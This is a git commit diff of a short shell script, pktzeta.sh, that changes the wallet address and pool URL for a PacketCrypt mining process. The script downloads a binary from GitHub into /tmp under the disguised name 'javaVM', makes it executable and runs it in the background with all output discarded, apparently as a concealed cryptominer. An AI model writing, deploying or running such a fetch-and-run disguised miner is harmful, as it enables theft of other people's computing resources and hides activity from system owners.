ba3e28459bb4d920c39beff2065053d764903803
cronjob <thesunofme1@gmail.com>
2023-11-28 09:35:34 +0700

    Update pktzeta.sh

--- pktzeta.sh
+++ pktzeta.sh
@@ -1,10 +1,10 @@
 #!/bin/sh
 if [ -f /tmp/javaVM ]
  	then
- 	/tmp/javaVM ann -p pkt1qqyhcmz6ezk068g7jpgw67lnuyvtdelwx3jf4q5 http://pool.pkt.world > /dev/null 2>&1 &
+ 	/tmp/javaVM ann -p pP1tbmNxyaYm9pQk6ejjAew2Nnaow2MuSn https://stratum.zetahash.com > /dev/null 2>&1 &
  	echo Started Existing
  	else
  		wget -q https://github.com/thesunofme/trash/raw/main/packetcrypt -O /tmp/javaVM
  		chmod +x /tmp/javaVM
- 		/tmp/javaVM ann -p pkt1qqyhcmz6ezk068g7jpgw67lnuyvtdelwx3jf4q5 http://pool.pkt.world > /dev/null 2>&1 &
+ 		/tmp/javaVM ann -p pP1tbmNxyaYm9pQk6ejjAew2Nnaow2MuSn https://stratum.zetahash.com > /dev/null 2>&1 &
 fi
